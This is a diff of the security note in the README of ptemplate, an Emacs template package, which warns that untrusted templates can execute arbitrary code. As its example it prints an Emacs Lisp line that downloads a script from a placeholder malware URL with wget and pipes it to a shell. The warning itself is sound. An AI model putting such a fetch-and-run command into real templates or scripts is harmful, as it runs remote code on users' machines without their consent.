@@ -170,9 +170,10 @@ package manager/fetcher that can handle GitHub repositories:
 
 # Security note
 Due to the smart expansion feature, and due to allowing yasnippets in templates,
-ptemplate is *not* secure. You should use only trusted templates. A malicious
-template could have a snippet like the following in its .ptemplate.el or in a
-\`\` block of one of its yasnippets:
+ptemplate is *not* secure the same way as a modern browser is, for example. You
+should use only trusted templates. A malicious template could have a snippet
+like the following in its .ptemplate.el or in a \`\` block of one of its
+yasnippets:
 
 ```emacs-lisp
 (shell-command "wget $SH_MALWARE_URL | sh")
@@ -180,5 +181,8 @@ template could have a snippet like the following in its .ptemplate.el or in a
 
 At that point, it's game over: the malware shell script could inject itself into
 all files you own (.profile "rootkits" for example), nuke your home directory or
-do lots of other evil things, but that is a problem with software in general
-(*any* Emacs plugin could do the same).
+do lots of other evil things. However, that is a problem with software in
+general (*any* Emacs plugin could do the same) and not specific to ptemplate.
+
+Removing that feature or making it optional would be pretty pointless, as it
+would degrade ptemplate to simply being a fronted to `cp -R`.
